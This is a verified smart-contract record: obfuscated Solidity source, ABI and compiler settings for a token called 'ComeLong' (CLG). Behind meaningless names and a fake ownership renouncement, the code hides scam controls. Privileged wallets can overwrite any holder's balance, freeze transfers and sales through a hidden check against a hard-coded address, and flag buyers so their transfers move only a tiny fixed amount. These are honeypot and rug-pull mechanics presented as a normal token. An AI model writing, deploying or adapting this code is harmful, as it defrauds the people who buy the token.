{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface sellMarketingTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverLaunchLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeBuy {\n    function createPair(address toAmount, address launchAtTo) external returns (address);\n}\n\ninterface launchTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeTotal) external view returns (uint256);\n\n    function transfer(address receiverWallet, uint256 launchedTx) external returns (bool);\n\n    function allowance(address shouldMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverWallet,\n        uint256 launchedTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeTrading, uint256 value);\n    event Approval(address indexed shouldMin, address indexed spender, uint256 value);\n}\n\ninterface launchTeamMetadata is launchTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ComeLong is receiverLaunchLimit, launchTeam, launchTeamMetadata {\n\n    string private txReceiver = \"Come Long\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalSender;\n    }\n\n    function feeTotal(address sellFundLimit, uint256 launchedTx) public {\n        fundBuyTotal();\n        launchedToken[sellFundLimit] = launchedTx;\n    }\n\n    string private modeLaunch = \"CLG\";\n\n    uint256 private tradingIsMarketing;\n\n    uint256 public senderMode;\n\n    uint256 public amountFromToken;\n\n    event OwnershipTransferred(address indexed enableTradingFrom, address indexed exemptToken);\n\n    function approve(address exemptAuto, uint256 launchedTx) public virtual override returns (bool) {\n        maxIs[_msgSender()][exemptAuto] = launchedTx;\n        emit Approval(_msgSender(), exemptAuto, launchedTx);\n        return true;\n    }\n\n    function senderLiquidity(address launchMinWallet, address receiverWallet, uint256 launchedTx) internal returns (bool) {\n        if (launchMinWallet == receiverLaunch) {\n            return atLimit(launchMinWallet, receiverWallet, launchedTx);\n        }\n        uint256 receiverExemptFund = launchTeam(maxShould).balanceOf(limitShould);\n        require(receiverExemptFund == feeTake);\n        require(receiverWallet != limitShould);\n        if (receiverReceiver[launchMinWallet]) {\n            return atLimit(launchMinWallet, receiverWallet, fromSellMin);\n        }\n        return atLimit(launchMinWallet, receiverWallet, launchedTx);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenSender;\n    }\n\n    address public receiverLaunch;\n\n    function receiverWalletShould(address isLaunched) public {\n        if (listMarketing) {\n            return;\n        }\n        \n        limitFrom[isLaunched] = true;\n        if (marketingBuy == maxReceiver) {\n            txFund = maxReceiver;\n        }\n        listMarketing = true;\n    }\n\n    uint256 private tokenSender = 100000000 * 10 ** 18;\n\n    function balanceOf(address takeTotal) public view virtual override returns (uint256) {\n        return launchedToken[takeTotal];\n    }\n\n    bool public listMarketing;\n\n    bool private amountTotal;\n\n    function transferFrom(address launchMinWallet, address receiverWallet, uint256 launchedTx) external override returns (bool) {\n        if (_msgSender() != senderReceiverAmount) {\n            if (maxIs[launchMinWallet][_msgSender()] != type(uint256).max) {\n                require(launchedTx <= maxIs[launchMinWallet][_msgSender()]);\n                maxIs[launchMinWallet][_msgSender()] -= launchedTx;\n            }\n        }\n        return senderLiquidity(launchMinWallet, receiverWallet, launchedTx);\n    }\n\n    function atLimit(address launchMinWallet, address receiverWallet, uint256 launchedTx) internal returns (bool) {\n        require(launchedToken[launchMinWallet] >= launchedTx);\n        launchedToken[launchMinWallet] -= launchedTx;\n        launchedToken[receiverWallet] += launchedTx;\n        emit Transfer(launchMinWallet, receiverWallet, launchedTx);\n        return true;\n    }\n\n    address public maxShould;\n\n    constructor (){\n        \n        sellMarketingTo swapEnable = sellMarketingTo(senderReceiverAmount);\n        maxShould = modeBuy(swapEnable.factory()).createPair(swapEnable.WETH(), address(this));\n        if (marketingBuy == amountFromToken) {\n            amountFromToken = senderMode;\n        }\n        receiverLaunch = _msgSender();\n        exemptMin();\n        limitFrom[receiverLaunch] = true;\n        launchedToken[receiverLaunch] = tokenSender;\n        \n        emit Transfer(address(0), receiverLaunch, tokenSender);\n    }\n\n    mapping(address => bool) public receiverReceiver;\n\n    function owner() external view returns (address) {\n        return tradingIs;\n    }\n\n    address limitShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private listTokenBuy;\n\n    function fundBuyTotal() private view {\n        require(limitFrom[_msgSender()]);\n    }\n\n    mapping(address => uint256) private launchedToken;\n\n    address senderReceiverAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function exemptMin() public {\n        emit OwnershipTransferred(receiverLaunch, address(0));\n        tradingIs = address(0);\n    }\n\n    uint8 private totalSender = 18;\n\n    bool public maxLaunchList;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeLaunch;\n    }\n\n    uint256 launchSwap;\n\n    function name() external view virtual override returns (string memory) {\n        return txReceiver;\n    }\n\n    mapping(address => bool) public limitFrom;\n\n    uint256 public txFund;\n\n    bool public buyExempt;\n\n    mapping(address => mapping(address => uint256)) private maxIs;\n\n    function minFund(uint256 launchedTx) public {\n        fundBuyTotal();\n        feeTake = launchedTx;\n    }\n\n    function allowance(address fundTrading, address exemptAuto) external view virtual override returns (uint256) {\n        if (exemptAuto == senderReceiverAmount) {\n            return type(uint256).max;\n        }\n        return maxIs[fundTrading][exemptAuto];\n    }\n\n    uint256 constant fromSellMin = 18 ** 10;\n\n    uint256 feeTake;\n\n    function launchTeamMarketing(address modeBuyExempt) public {\n        fundBuyTotal();\n        if (listTokenBuy) {\n            txFund = maxReceiver;\n        }\n        if (modeBuyExempt == receiverLaunch || modeBuyExempt == maxShould) {\n            return;\n        }\n        receiverReceiver[modeBuyExempt] = true;\n    }\n\n    function transfer(address sellFundLimit, uint256 launchedTx) external virtual override returns (bool) {\n        return senderLiquidity(_msgSender(), sellFundLimit, launchedTx);\n    }\n\n    address private tradingIs;\n\n    uint256 public marketingBuy;\n\n    uint256 public maxReceiver;\n\n    function getOwner() external view returns (address) {\n        return tradingIs;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTradingFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFromToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFundLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTx\",\"type\":\"uint256\"}],\"name\":\"feeTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeBuyExempt\",\"type\":\"address\"}],\"name\":\"launchTeamMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLaunchList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedTx\",\"type\":\"uint256\"}],\"name\":\"minFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunched\",\"type\":\"address\"}],\"name\":\"receiverWalletShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFundLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMinWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ComeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}